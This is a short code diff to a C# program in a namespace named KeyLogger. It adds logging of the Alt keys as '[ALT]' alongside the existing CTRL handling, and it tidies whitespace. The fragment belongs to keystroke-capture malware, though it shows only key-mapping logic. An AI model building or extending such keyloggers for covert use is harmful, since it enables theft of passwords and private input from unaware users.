@@ -462,6 +462,12 @@ namespace KeyLogger
                     {
                         sw.Write("[CTRL]");
                     }
+                    // Alt
+                    else if (vkCode.ToString() == "164"
+                        || vkCode.ToString() == "165")
+                    {
+                        sw.Write("[ALT]");
+                    }
                     //
                     else if (vkCode.ToString() == "186")
                     {
@@ -515,7 +521,7 @@ namespace KeyLogger
                     {
                         sw.Write(Environment.NewLine);
                     }
-
+                    
 
                     sw.Close();
                 }
